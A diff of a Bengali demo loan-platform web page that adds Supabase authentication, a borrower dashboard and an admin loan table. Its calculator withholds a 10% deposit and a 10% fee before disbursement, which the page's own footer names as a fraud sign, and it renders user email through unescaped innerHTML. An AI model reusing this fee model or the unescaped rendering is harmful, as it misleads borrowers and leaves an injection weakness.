@@ -7,12 +7,13 @@
 <link rel="preconnect" href="https://fonts.googleapis.com" />
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet" />
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
   :root{
     --bg:#f5f8fb; --card:#fff; --ink:#0f172a; --muted:#64748b;
     --line:#e2e8f0; --brand:#0d9488; --brand-dark:#0f766e;
     --brand-soft:#ccfbf1; --warn-soft:#fef3c7; --warn:#b45309;
-    --danger:#dc2626; --radius:16px;
+    --danger:#dc2626; --ok:#059669; --radius:16px;
   }
   *{box-sizing:border-box;margin:0;padding:0}
   html{scroll-behavior:smooth}
@@ -21,24 +22,33 @@
     background:var(--bg);color:var(--ink);line-height:1.65;
   }
   .wrap{max-width:1100px;margin:0 auto;padding:0 20px}
+  .hidden{display:none!important}
 
-  /* ---------- Demo Warning Bar ---------- */
+  /* Demo Bar */
   .demo-bar{
     background:var(--warn-soft);color:var(--warn);
-    border-bottom:1px solid #fde68a;font-size:14px;font-weight:500;
-    text-align:center;padding:10px 16px;
+    border-bottom:1px solid #fde68a;font-size:13px;font-weight:500;
+    text-align:center;padding:9px 16px;
   }
 
-  /* ---------- Nav ---------- */
+  /* Nav */
   .nav{background:#fff;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:50}
-  .nav-inner{display:flex;align-items:center;justify-content:space-between;height:64px}
+  .nav-inner{display:flex;align-items:center;justify-content:space-between;height:64px;gap:12px;flex-wrap:wrap}
   .brand{font-size:22px;font-weight:700;color:var(--ink);text-decoration:none;letter-spacing:.5px}
   .brand span{color:var(--brand)}
-  .nav nav{display:flex;gap:24px}
-  .nav nav a{color:var(--muted);text-decoration:none;font-weight:500;font-size:15px}
-  .nav nav a:hover{color:var(--brand)}
+  .nav nav{display:flex;gap:18px;align-items:center;flex-wrap:wrap}
+  .nav nav a,.nav nav button{
+    color:var(--muted);text-decoration:none;font-weight:500;font-size:14px;
+    background:none;border:none;cursor:pointer;font-family:inherit;padding:6px 2px;
+  }
+  .nav nav a:hover,.nav nav button:hover{color:var(--brand)}
+  .nav .user-chip{
+    background:var(--brand-soft);color:var(--brand-dark);
+    padding:5px 12px;border-radius:999px;font-size:12.5px;font-weight:600;
+    max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
+  }
 
-  /* ---------- Hero ---------- */
+  /* Hero */
   .hero{
     padding:56px 0 32px;text-align:center;
     background:radial-gradient(1200px 400px at 50% -50%,var(--brand-soft),transparent);
@@ -48,63 +58,58 @@
   .hero p{color:var(--muted);font-size:17px;margin-top:14px}
   .hero .btn{margin-top:26px}
 
-  /* ---------- Buttons ---------- */
+  /* Buttons */
   .btn{
     display:inline-block;background:var(--brand);color:#fff;font-weight:600;
-    padding:13px 28px;border:none;border-radius:12px;font-size:16px;
+    padding:12px 26px;border:none;border-radius:12px;font-size:15px;
     text-decoration:none;cursor:pointer;font-family:inherit;
     transition:background .15s,transform .1s;
   }
   .btn:hover{background:var(--brand-dark)}
   .btn:active{transform:scale(.98)}
+  .btn:disabled{opacity:.5;cursor:not-allowed}
   .btn-block{display:block;width:100%;text-align:center;margin-top:14px}
+  .btn-sm{padding:7px 14px;font-size:13px;border-radius:8px}
+  .btn-outline{background:#fff;border:1.5px solid var(--line);color:var(--ink)}
+  .btn-outline:hover{background:var(--bg);border-color:var(--brand);color:var(--brand)}
+  .btn-ok{background:var(--ok)}
+  .btn-ok:hover{background:#047857}
+  .btn-danger{background:var(--danger)}
+  .btn-danger:hover{background:#b91c1c}
 
-  /* ---------- Cards ---------- */
+  /* Cards */
   .card{
     background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
     padding:26px;box-shadow:0 1px 2px rgba(15,23,42,.04);
   }
   .card h2{font-size:19px;margin-bottom:18px;font-weight:700}
 
-  /* ---------- Calculator ---------- */
+  /* Calculator */
   .calc-grid{display:grid;grid-template-columns:1fr 1fr;gap:22px;margin-top:12px}
-  label{display:block;font-size:14px;font-weight:600;color:var(--muted);margin:18px 0 8px}
-  label:first-of-type{margin-top:0}
+  label.lbl{display:block;font-size:14px;font-weight:600;color:var(--muted);margin:18px 0 8px}
+  label.lbl:first-of-type{margin-top:0}
 
-  .amount-display{
-    font-size:30px;font-weight:700;color:var(--brand);margin-bottom:6px;
-  }
-  input[type=range]{
-    width:100%;accent-color:var(--brand);height:6px;cursor:pointer;
-  }
+  .amount-display{font-size:30px;font-weight:700;color:var(--brand);margin-bottom:6px}
+  input[type=range]{width:100%;accent-color:var(--brand);height:6px;cursor:pointer}
   .range-labels{display:flex;justify-content:space-between;font-size:12px;color:var(--muted);margin-top:4px}
 
   .term-btns{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
   .term-btns button{
     padding:10px 0;border:1.5px solid var(--line);background:#fff;border-radius:10px;
-    font-family:inherit;font-size:14px;font-weight:600;color:var(--muted);cursor:pointer;
-    transition:.15s;
+    font-family:inherit;font-size:14px;font-weight:600;color:var(--muted);cursor:pointer;transition:.15s;
   }
   .term-btns button:hover{border-color:var(--brand);color:var(--brand)}
   .term-btns button.active{background:var(--brand);border-color:var(--brand);color:#fff}
 
-  .rate-box{
-    background:var(--brand-soft);color:var(--brand-dark);font-weight:600;
-    padding:10px 14px;border-radius:10px;font-size:14px;
-  }
+  .rate-box{background:var(--brand-soft);color:var(--brand-dark);font-weight:600;padding:10px 14px;border-radius:10px;font-size:14px}
 
-  /* ---------- Breakdown ---------- */
+  /* Breakdown */
   .breakdown{list-style:none}
-  .breakdown li{
-    display:flex;justify-content:space-between;gap:12px;
-    padding:9px 0;border-bottom:1px dashed var(--line);font-size:15px;
-  }
+  .breakdown li{display:flex;justify-content:space-between;gap:12px;padding:9px 0;border-bottom:1px dashed var(--line);font-size:15px}
   .breakdown li:last-child{border-bottom:none}
   .breakdown li span{color:var(--muted)}
   .breakdown li b{font-weight:600}
-  .breakdown li.net{
-    background:#f0fdfa;margin:6px -10px;padding:12px 10px;border-radius:10px;border-bottom:none;
-  }
+  .breakdown li.net{background:#f0fdfa;margin:6px -10px;padding:12px 10px;border-radius:10px;border-bottom:none}
   .breakdown li.net b{color:var(--brand-dark);font-size:17px}
 
   .emi-box{
@@ -117,7 +122,7 @@
 
   .note{font-size:12.5px;color:var(--muted);margin-top:12px}
 
-  /* ---------- Features ---------- */
+  /* Features */
   .features{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin:44px 0}
   .feature{background:#fff;border:1px solid var(--line);border-radius:var(--radius);padding:22px}
   .feature .ico{
@@ -127,36 +132,70 @@
   .feature h3{font-size:16px;margin-bottom:6px}
   .feature p{font-size:14px;color:var(--muted)}
 
-  /* ---------- Form ---------- */
+  /* Form */
   .apply-card{margin:20px 0 44px}
   .grid2{display:grid;grid-template-columns:1fr 1fr;gap:18px}
-  .grid2 input,.grid2 select{
+  .field label{display:block;font-size:13px;font-weight:600;color:var(--muted);margin-bottom:6px}
+  .field input,.field select{
     width:100%;padding:12px 14px;border:1.5px solid var(--line);border-radius:10px;
-    font-family:inherit;font-size:15px;background:#fff;color:var(--ink);
-    transition:border-color .15s;
+    font-family:inherit;font-size:15px;background:#fff;color:var(--ink);transition:border-color .15s;
   }
-  .grid2 input:focus,.grid2 select:focus{
+  .field input:focus,.field select:focus{
     outline:none;border-color:var(--brand);box-shadow:0 0 0 3px var(--brand-soft);
   }
-  .check{
-    display:flex;align-items:flex-start;gap:10px;margin:22px 0;
-    font-size:14px;color:var(--muted);font-weight:500;
-  }
+  .check{display:flex;align-items:flex-start;gap:10px;margin:22px 0;font-size:14px;color:var(--muted);font-weight:500}
   .check input{width:18px;height:18px;accent-color:var(--brand);margin-top:2px;flex-shrink:0}
-  .msg{margin-top:14px;font-size:14.5px;font-weight:600}
-  .msg.ok{color:var(--brand-dark)}
+  .msg{margin-top:14px;font-size:14.5px;font-weight:600;min-height:1.5em}
 
-  /* ---------- Footer ---------- */
-  footer{background:#0f172a;color:#cbd5e1;padding:36px 0;font-size:14px}
+  /* Auth */
+  .auth-wrap{max-width:430px;margin:40px auto}
+  .tabs{display:flex;border-bottom:1.5px solid var(--line);margin-bottom:22px}
+  .tabs button{
+    flex:1;background:none;border:none;padding:12px;font-family:inherit;
+    font-size:15px;font-weight:600;color:var(--muted);cursor:pointer;
+    border-bottom:2px solid transparent;margin-bottom:-1.5px;
+  }
+  .tabs button.active{color:var(--brand);border-bottom-color:var(--brand)}
+
+  /* Dashboard / Admin */
+  .loan-list{display:grid;gap:14px}
+  .loan-item{border:1px solid var(--line);border-radius:12px;padding:16px;background:#fff}
+  .loan-item .row{display:flex;justify-content:space-between;gap:8px;margin-bottom:8px;font-size:14px;align-items:center;flex-wrap:wrap}
+  .loan-item .row b{font-size:15px}
+  .badge{display:inline-block;padding:3px 10px;border-radius:999px;font-size:12px;font-weight:600}
+  .badge.pending{background:#fef3c7;color:#b45309}
+  .badge.approved{background:#dbeafe;color:#1e40af}
+  .badge.disbursed{background:#d1fae5;color:#065f46}
+  .badge.rejected{background:#fee2e2;color:#b91c1c}
+  .empty{text-align:center;color:var(--muted);padding:40px 20px;font-size:15px}
+
+  .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:22px}
+  .stat{background:#fff;border:1px solid var(--line);border-radius:12px;padding:16px}
+  .stat .k{font-size:11.5px;color:var(--muted);font-weight:600;text-transform:uppercase;letter-spacing:.5px}
+  .stat .v{font-size:22px;font-weight:700;margin-top:4px}
+
+  .table-wrap{overflow-x:auto;border:1px solid var(--line);border-radius:12px;background:#fff}
+  table.loans{width:100%;border-collapse:collapse;font-size:14px;min-width:760px}
+  table.loans th{
+    background:#f8fafc;text-align:left;padding:10px 12px;font-weight:600;color:var(--muted);
+    font-size:11.5px;text-transform:uppercase;letter-spacing:.4px;border-bottom:1px solid var(--line);
+  }
+  table.loans td{padding:12px;border-bottom:1px solid var(--line);vertical-align:middle}
+  table.loans tr:last-child td{border-bottom:none}
+  .actions{display:flex;gap:6px;flex-wrap:wrap}
+
+  /* Footer */
+  footer{background:#0f172a;color:#cbd5e1;padding:36px 0;font-size:14px;margin-top:40px}
   footer .legal{font-size:12.5px;color:#94a3b8;margin-top:14px;line-height:1.7}
   footer .legal strong{color:#f87171}
 
-  /* ---------- Responsive ---------- */
+  /* Responsive */
   @media (max-width:820px){
     .calc-grid{grid-template-columns:1fr}
     .features{grid-template-columns:1fr}
     .grid2{grid-template-columns:1fr}
-    .nav nav{display:none}
+    .stats{grid-template-columns:1fr 1fr}
+    .nav nav{gap:10px}
   }
 </style>
 </head>
@@ -168,134 +207,129 @@
 
 <header class="nav">
   <div class="wrap nav-inner">
-    <a class="brand" href="#">ঋণ<span>সাথী</span></a>
+    <a class="brand" href="#" onclick="go('home');return false">ঋণ<span>সাথী</span></a>
     <nav>
-      <a href="#calculator">ক্যালকুলেটর</a>
-      <a href="#features">সুবিধা</a>
-      <a href="#apply">আবেদন</a>
+      <a href="#" onclick="go('home');return false">হোম</a>
+      <a href="#" onclick="go('apply');return false">আবেদন</a>
+      <span id="navAuth"></span>
     </nav>
   </div>
 </header>
 
 <main>
 
-  <!-- Hero -->
-  <section class="hero wrap">
-    <h1>সহজে, দ্রুত, <em>স্বচ্ছ</em> লোন</h1>
-    <p>১০,০০০ টাকা থেকে শুরু · ৬% বার্ষিক সুদ · সম্পূর্ণ অনলাইনে</p>
-    <a class="btn" href="#apply">এখনই আবেদন করুন</a>
-  </section>
+  <!-- ============ HOME / CALCULATOR ============ -->
+  <section id="page-home">
+    <div class="hero wrap">
+      <h1>সহজে, দ্রুত, <em>স্বচ্ছ</em> লোন</h1>
+      <p>১০,০০০ টাকা থেকে শুরু · ৬% বার্ষিক সুদ · সম্পূর্ণ অনলাইনে</p>
+      <button class="btn" onclick="go('apply')">এখনই আবেদন করুন</button>
+    </div>
 
-  <!-- Calculator -->
-  <section id="calculator" class="wrap calc-grid">
+    <div id="calculator" class="wrap calc-grid" style="margin-bottom:36px">
+      <div class="card">
+        <h2>লোন ক্যালকুলেটর</h2>
+        <label class="lbl">লোনের পরিমাণ</label>
+        <div class="amount-display" id="amountDisplay">৳ ১০,০০০</div>
+        <input type="range" id="amount" min="10000" max="100000" step="5000" value="10000" />
+        <div class="range-labels"><span>৳ ১০,০০০</span><span>৳ ১,০০,০০০</span></div>
 
-    <div class="card">
-      <h2>লোন ক্যালকুলেটর</h2>
+        <label class="lbl">পরিশোধের মেয়াদ</label>
+        <div class="term-btns" id="termBtns">
+          <button type="button" data-m="3">৩ মাস</button>
+          <button type="button" data-m="6">৬ মাস</button>
+          <button type="button" data-m="12" class="active">১২ মাস</button>
+          <button type="button" data-m="24">২৪ মাস</button>
+        </div>
 
-      <label>লোনের পরিমাণ</label>
-      <div class="amount-display" id="amountDisplay">৳ ১০,০০০</div>
-      <input type="range" id="amount" min="10000" max="100000" step="5000" value="10000" />
-      <div class="range-labels"><span>৳ ১০,০০০</span><span>৳ ১,০০,০০০</span></div>
-
-      <label>পরিশোধের মেয়াদ</label>
-      <div class="term-btns" id="termBtns">
-        <button type="button" data-m="3">৩ মাস</button>
-        <button type="button" data-m="6">৬ মাস</button>
-        <button type="button" data-m="12" class="active">১২ মাস</button>
-        <button type="button" data-m="24">২৪ মাস</button>
+        <label class="lbl">সুদের হার</label>
+        <div class="rate-box">৬% বার্ষিক (ফ্ল্যাট)</div>
       </div>
 
-      <label>সুদের হার</label>
-      <div class="rate-box">৬% বার্ষিক (ফ্ল্যাট)</div>
-    </div>
-
-    <div class="card">
-      <h2>হিসাবের বিবরণ</h2>
-      <ul class="breakdown">
-        <li><span>লোনের পরিমাণ</span><b id="bAmount">৳ ১০,০০০</b></li>
-        <li><span>নিরাপত্তা আমানত (১০%)</span><b id="bDeposit">৳ ১,০০০</b></li>
-        <li><span>প্রসেসিং ফি (১০%)</span><b id="bFee">৳ ১,০০০</b></li>
-        <li class="net"><span>আপনি হাতে পাবেন</span><b id="bNet">৳ ৮,০০০</b></li>
-        <li><span>মোট সুদ (৬%)</span><b id="bInterest">৳ ৬০০</b></li>
-        <li><span>মোট পরিশোধযোগ্য</span><b id="bTotal">৳ ১০,৬০০</b></li>
-      </ul>
-
-      <div class="emi-box">
-        <span>মাসিক কিস্তি (EMI)</span>
-        <b id="bEmi">৳ ৮৮৩</b>
+      <div class="card">
+        <h2>হিসাবের বিবরণ</h2>
+        <ul class="breakdown">
+          <li><span>লোনের পরিমাণ</span><b id="bAmount">৳ ১০,০০০</b></li>
+          <li><span>নিরাপত্তা আমানত (১০%)</span><b id="bDeposit">৳ ১,০০০</b></li>
+          <li><span>প্রসেসিং ফি (১০%)</span><b id="bFee">৳ ১,০০০</b></li>
+          <li class="net"><span>আপনি হাতে পাবেন</span><b id="bNet">৳ ৮,০০০</b></li>
+          <li><span>মোট সুদ (৬%)</span><b id="bInterest">৳ ৬০০</b></li>
+          <li><span>মোট পরিশোধযোগ্য</span><b id="bTotal">৳ ১০,৬০০</b></li>
+        </ul>
+        <div class="emi-box">
+          <span>মাসিক কিস্তি (EMI)</span>
+          <b id="bEmi">৳ ৮৮৩</b>
+        </div>
+        <p class="note">* নিরাপত্তা আমানত সম্পূর্ণ পরিশোধের পর ফেরতযোগ্য। হিসাবটি শুধু ডেমো।</p>
+        <button class="btn btn-block" onclick="go('apply')">এই শর্তে আবেদন করুন</button>
       </div>
-
-      <p class="note">
-        * নিরাপত্তা আমানত সম্পূর্ণ পরিশোধের পর ফেরতযোগ্য। হিসাবটি শুধু ডেমো।
-      </p>
-
-      <a class="btn btn-block" href="#apply">এই শর্তে আবেদন করুন</a>
     </div>
 
-  </section>
-
-  <!-- Features -->
-  <section id="features" class="wrap features">
-    <div class="feature">
-      <div class="ico">⚡</div>
-      <h3>দ্রুত অনুমোদন</h3>
-      <p>অনলাইনে আবেদন, KYC যাচাই শেষে দ্রুত সিদ্ধান্ত।</p>
-    </div>
-    <div class="feature">
-      <div class="ico">🔒</div>
-      <h3>নিরাপদ ও স্বচ্ছ</h3>
-      <p>সব ফি ও সুদ আবেদনের আগেই স্পষ্টভাবে দেখানো হয়।</p>
-    </div>
-    <div class="feature">
-      <div class="ico">📱</div>
-      <h3>মোবাইল ফ্রেন্ডলি</h3>
-      <p>bKash, Nagad ও ব্যাংক — যেকোনো উপায়ে কিস্তি পরিশোধ।</p>
+    <div id="features" class="wrap features">
+      <div class="feature"><div class="ico">⚡</div><h3>দ্রুত অনুমোদন</h3><p>অনলাইনে আবেদন, KYC যাচাই শেষে দ্রুত সিদ্ধান্ত।</p></div>
+      <div class="feature"><div class="ico">🔒</div><h3>নিরাপদ ও স্বচ্ছ</h3><p>সব ফি ও সুদ আবেদনের আগেই স্পষ্টভাবে দেখানো হয়।</p></div>
+      <div class="feature"><div class="ico">📱</div><h3>মোবাইল ফ্রেন্ডলি</h3><p>bKash, Nagad ও ব্যাংক — যেকোনো উপায়ে কিস্তি পরিশোধ।</p></div>
     </div>
   </section>
 
-  <!-- Application Form -->
-  <section id="apply" class="wrap">
-    <div class="card apply-card">
+  <!-- ============ APPLY ============ -->
+  <section id="page-apply" class="wrap hidden" style="margin-top:32px">
+    <div class="card apply-card" style="max-width:780px;margin:0 auto">
       <h2>লোন আবেদন ফর্ম</h2>
+
+      <div id="applyAuthGate" class="hidden" style="text-align:center;padding:24px 0">
+        <p style="color:var(--muted);margin-bottom:16px">আবেদন করতে আগে লগইন/সাইনআপ করুন।</p>
+        <button class="btn" onclick="go('auth')">লগইন / সাইনআপ</button>
+      </div>
+
       <form id="applyForm" novalidate>
         <div class="grid2">
-          <div>
+          <div class="field">
             <label>পূর্ণ নাম</label>
             <input type="text" name="name" placeholder="আপনার নাম" required />
           </div>
-          <div>
+          <div class="field">
             <label>মোবাইল নম্বর</label>
             <input type="tel" name="phone" placeholder="01XXXXXXXXX"
                    pattern="01[3-9][0-9]{8}" required />
           </div>
-          <div>
+          <div class="field">
             <label>জাতীয় পরিচয়পত্র (NID) নম্বর</label>
             <input type="text" name="nid" placeholder="১০ ডিজিট" required />
           </div>
-          <div>
+          <div class="field">
             <label>পেশা</label>
             <select name="job" required>
               <option value="">নির্বাচন করুন</option>
-              <option>চাকরি (সরকারি/বেসরকারি)</option>
-              <option>ব্যবসা</option>
-              <option>ফ্রিল্যান্সার</option>
-              <option>শিক্ষার্থী</option>
-              <option>অন্যান্য</option>
+              <option value="job-gov">চাকরি (সরকারি/বেসরকারি)</option>
+              <option value="business">ব্যবসা</option>
+              <option value="freelancer">ফ্রিল্যান্সার</option>
+              <option value="student">শিক্ষার্থী</option>
+              <option value="other">অন্যান্য</option>
             </select>
           </div>
-          <div>
+          <div class="field">
             <label>মাসিক আয় (৳)</label>
-            <input type="number" name="income" min="0" placeholder="যেমন: ২৫০০০" required />
+            <input type="number" name="income" min="0" placeholder="যেমন: 25000" required />
           </div>
-          <div>
+          <div class="field">
             <label>লোনের পরিমাণ (৳)</label>
             <select name="loanAmount" required>
-              <option>১০,০০০</option>
-              <option>১৫,০০০</option>
-              <option>২০,০০০</option>
-              <option>৩০,০০০</option>
-              <option>৫০,০০০</option>
-              <option>১,০০,০০০</option>
+              <option value="10000">১০,০০০</option>
+              <option value="15000">১৫,০০০</option>
+              <option value="20000">২০,০০০</option>
+              <option value="30000">৩০,০০০</option>
+              <option value="50000">৫০,০০০</option>
+              <option value="100000">১,০০,০০০</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>মেয়াদ (মাস)</label>
+            <select name="term" required>
+              <option value="3">৩ মাস</option>
+              <option value="6">৬ মাস</option>
+              <option value="12" selected>১২ মাস</option>
+              <option value="24">২৪ মাস</option>
             </select>
           </div>
         </div>
@@ -305,9 +339,77 @@
           <span>আমি শর্তাবলী, সুদ-ফি ও গোপনীয়তা নীতিতে সম্মত আছি এবং প্রদত্ত তথ্য সত্য।</span>
         </label>
 
-        <button class="btn" type="submit">আবেদন জমা দিন</button>
+        <button class="btn" type="submit" id="submitBtn">আবেদন জমা দিন</button>
         <p id="formMsg" class="msg" role="status"></p>
       </form>
+    </div>
+  </section>
+
+  <!-- ============ AUTH ============ -->
+  <section id="page-auth" class="wrap hidden">
+    <div class="auth-wrap card">
+      <div class="tabs">
+        <button id="tabLogin" class="active" onclick="switchAuthTab('login')">লগইন</button>
+        <button id="tabSignup" onclick="switchAuthTab('signup')">সাইনআপ</button>
+      </div>
+
+      <form id="loginForm">
+        <div class="field" style="margin-bottom:14px">
+          <label>ইমেইল</label><input type="email" name="email" required />
+        </div>
+        <div class="field" style="margin-bottom:18px">
+          <label>পাসওয়ার্ড</label><input type="password" name="password" required minlength="6" />
+        </div>
+        <button class="btn btn-block" type="submit">লগইন করুন</button>
+        <p id="loginMsg" class="msg"></p>
+      </form>
+
+      <form id="signupForm" class="hidden">
+        <div class="field" style="margin-bottom:14px">
+          <label>পূর্ণ নাম</label><input type="text" name="name" required />
+        </div>
+        <div class="field" style="margin-bottom:14px">
+          <label>ইমেইল</label><input type="email" name="email" required />
+        </div>
+        <div class="field" style="margin-bottom:18px">
+          <label>পাসওয়ার্ড (কমপক্ষে ৬ অক্ষর)</label>
+          <input type="password" name="password" required minlength="6" />
+        </div>
+        <button class="btn btn-block" type="submit">অ্যাকাউন্ট তৈরি করুন</button>
+        <p id="signupMsg" class="msg"></p>
+      </form>
+    </div>
+  </section>
+
+  <!-- ============ DASHBOARD ============ -->
+  <section id="page-dashboard" class="wrap hidden" style="margin-top:32px">
+    <div class="card" style="margin-bottom:22px">
+      <h2>আমার লোনসমূহ</h2>
+      <div id="dashboardList" class="loan-list"><div class="empty">লোড হচ্ছে...</div></div>
+    </div>
+  </section>
+
+  <!-- ============ ADMIN ============ -->
+  <section id="page-admin" class="wrap hidden" style="margin-top:32px">
+    <div class="stats">
+      <div class="stat"><div class="k">মোট আবেদন</div><div class="v" id="stTotal">০</div></div>
+      <div class="stat"><div class="k">অপেক্ষমাণ</div><div class="v" id="stPending">০</div></div>
+      <div class="stat"><div class="k">অনুমোদিত</div><div class="v" id="stApproved">০</div></div>
+      <div class="stat"><div class="k">মোট পরিমাণ</div><div class="v" id="stAmount">৳ ০</div></div>
+    </div>
+    <div class="card">
+      <h2>সব লোন আবেদন</h2>
+      <div class="table-wrap">
+        <table class="loans">
+          <thead>
+            <tr>
+              <th>গ্রাহক</th><th>মোবাইল</th><th>পরিমাণ</th><th>মেয়াদ</th>
+              <th>স্ট্যাটাস</th><th>তারিখ</th><th>অ্যাকশন</th>
+            </tr>
+          </thead>
+          <tbody id="adminBody"><tr><td colspan="7" class="empty">লোড হচ্ছে...</td></tr></tbody>
+        </table>
+      </div>
     </div>
   </section>
 
@@ -319,153 +421,398 @@
     <div>একটি ডেমো লোন প্ল্যাটফর্ম প্রোটোটাইপ।</div>
     <p class="legal">
       <strong>আইনি সতর্কতা:</strong> বাংলাদেশে অনুমোদন ছাড়া ডিজিটাল মাধ্যমে ঋণ প্রদান বা সুদ আদায় অবৈধ।
-      ঋণ দেওয়ার আগে ঋণ দেওয়ার আগে বাংলাদেশ ব্যাংক / MRA লাইসেন্স, AML/KYC ও গ্রাহক সুরক্ষা নীতি মেনে চলা বাধ্যতামূলক।
-      ঋণ disbursement-এর আগে গ্রাহকের কাছ থেকে অগ্রিম ফি বা আমানত নেওয়া প্রতারণার অন্যতম লক্ষণ — এই মডেলটি বাস্তবে চালানোর আগে অবশ্যই আইনজীবীর পরামর্শ নিন।
+      বাংলাদেশ ব্যাংক / MRA লাইসেন্স, AML/KYC ও গ্রাহক সুরক্ষা নীতি মানা বাধ্যতামূলক।
+      ঋণ disbursement-এর আগে গ্রাহকের কাছ থেকে অগ্রিম ফি বা আমানত নেওয়া প্রতারণার অন্যতম লক্ষণ —
+      এই মডেলটি বাস্তবে চালানোর আগে অবশ্যই আইনজীবীর পরামর্শ নিন।
     </p>
   </div>
 </footer>
 
 <script>
-  /* ---------- সংখ্যা ফরম্যাটিং (বাংলা) ---------- */
-  const BN = '০১২৩৪৫৬৭৮৯';
-  const toBn = n => String(Math.round(n)).replace(/\d/g, d => BN[+d]);
-  const tk   = n => '৳ ' + toBn(n).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+/* =========================================================
+   1) SUPABASE SETUP
+========================================================= */
+const SUPABASE_URL     = 'https://dtwdwcfbxbchcwjqgwel.supabase.co';
+const SUPABASE_ANON_KEY= 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImR0d2R3Y2ZieGJjaGN3anFnd2VsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTUyODI3NDIsImV4cCI6MjExMDg1ODc0Mn0._YYJrVVjDwm0sXwQJn5ik5zBaK6YN1KUmzSQ_uiJSqw';
 
-  /* ---------- Constants ---------- */
-  const RATE = 0.06;   // বার্ষিক ফ্ল্যাট সুদ
-  const DEP  = 0.10;   // নিরাপত্তা আমানত
-  const FEE  = 0.10;   // প্রসেসিং ফি
+const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-  /* ---------- State ---------- */
-  const state = { amount: 10000, months: 12 };
+let currentUser = null;
+let isAdmin = false;
 
-  /* ---------- Elements ---------- */
-  const $ = id => document.getElementById(id);
-  const amountInput = $('amount');
+/* =========================================================
+   2) HELPERS
+========================================================= */
+const BN = '০১২৩৪৫৬৭৮৯';
+const toBn = n => String(Math.round(n)).replace(/\d/g, d => BN[+d]);
+const tk   = n => '৳ ' + toBn(n).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+const $    = id => document.getElementById(id);
+const show = (id, on) => $(id).classList.toggle('hidden', !on);
 
-  /* ---------- Recalculate ---------- */
-  function recalc(){
-    const a = state.amount;
-    const m = state.months;
+function statusBn(s){
+  return ({pending:'অপেক্ষমাণ', approved:'অনুমোদিত',
+           disbursed:'বিতরণ', rejected:'বাতিল'})[s] || s;
+}
 
-    const interest = a * RATE * (m / 12);
-    const total    = a + interest;
-    const emi      = total / m;
-    const deposit  = a * DEP;
-    const fee      = a * FEE;
-    const net      = a - deposit - fee;
+/* =========================================================
+   3) ROUTING
+========================================================= */
+function go(page){
+  ['home','apply','auth','dashboard','admin'].forEach(p =>
+    show('page-' + p, p === page)
+  );
+  if(page === 'apply')     updateApplyGate();
+  if(page === 'dashboard' && currentUser) loadDashboard();
+  if(page === 'admin'     && currentUser) loadAdmin();
+  window.scrollTo({top:0, behavior:'smooth'});
+}
 
-    $('amountDisplay').textContent = tk(a);
-    $('bAmount').textContent   = tk(a);
-    $('bDeposit').textContent  = tk(deposit);
-    $('bFee').textContent      = tk(fee);
-    $('bNet').textContent      = tk(net);
-    $('bInterest').textContent = tk(interest);
-    $('bTotal').textContent    = tk(total);
-    $('bEmi').textContent      = tk(emi);
+/* =========================================================
+   4) AUTH STATE
+========================================================= */
+sb.auth.onAuthStateChange(async (_event, session) => {
+  currentUser = session?.user || null;
+  isAdmin = false;
+
+  if(currentUser){
+    // Try fetch admin flag; ignore errors silently
+    try{
+      const { data } = await sb.from('profiles')
+        .select('is_admin').eq('user_id', currentUser.id).maybeSingle();
+      isAdmin = !!data?.is_admin;
+    }catch(_){}
   }
 
-  /* ---------- Events ---------- */
-  amountInput.addEventListener('input', e => {
-    state.amount = +e.target.value;
+  renderNav();
+  updateApplyGate();
+});
+
+function renderNav(){
+  const nav = $('navAuth');
+  if(!currentUser){
+    nav.innerHTML = `<a href="#" onclick="go('auth');return false">লগইন</a>`;
+    return;
+  }
+  const email = currentUser.email || 'anonymous';
+  nav.innerHTML = `
+    <span class="user-chip" title="${email}">${email}</span>
+    <a href="#" onclick="go('dashboard');return false">ড্যাশবোর্ড</a>
+    ${isAdmin ? `<a href="#" onclick="go('admin');return false">অ্যাডমিন</a>` : ''}
+    <a href="#" onclick="doLogout();return false">লগআউট</a>
+  `;
+}
+
+/* =========================================================
+   5) AUTH FORMS
+========================================================= */
+function switchAuthTab(tab){
+  $('tabLogin').classList.toggle('active',  tab === 'login');
+  $('tabSignup').classList.toggle('active', tab === 'signup');
+  show('loginForm',  tab === 'login');
+  show('signupForm', tab === 'signup');
+}
+
+$('loginForm').addEventListener('submit', async e => {
+  e.preventDefault();
+  const fd  = new FormData(e.target);
+  const msg = $('loginMsg');
+  msg.textContent = 'অপেক্ষা করুন...';
+  msg.style.color = 'var(--muted)';
+
+  const { error } = await sb.auth.signInWithPassword({
+    email: fd.get('email'),
+    password: fd.get('password'),
+  });
+  if(error){
+    msg.textContent = '❌ ' + error.message;
+    msg.style.color = 'var(--danger)';
+    return;
+  }
+  msg.textContent = '✅ সফল!';
+  msg.style.color = 'var(--ok)';
+  e.target.reset();
+  setTimeout(() => go('dashboard'), 300);
+});
+
+$('signupForm').addEventListener('submit', async e => {
+  e.preventDefault();
+  const fd  = new FormData(e.target);
+  const msg = $('signupMsg');
+  msg.textContent = 'অপেক্ষা করুন...';
+  msg.style.color = 'var(--muted)';
+
+  const { data, error } = await sb.auth.signUp({
+    email: fd.get('email'),
+    password: fd.get('password'),
+  });
+  if(error){
+    msg.textContent = '❌ ' + error.message;
+    msg.style.color = 'var(--danger)';
+    return;
+  }
+  if(data.user){
+    await sb.from('profiles').upsert({
+      user_id: data.user.id,
+      full_name: fd.get('name'),
+    }, { onConflict: 'user_id' });
+  }
+  msg.textContent = '✅ অ্যাকাউন্ট তৈরি! ইমেইল ভেরিফাই করতে হতে পারে।';
+  msg.style.color = 'var(--ok)';
+  e.target.reset();
+  setTimeout(() => go('dashboard'), 1200);
+});
+
+async function doLogout(){
+  await sb.auth.signOut();
+  go('home');
+}
+
+/* =========================================================
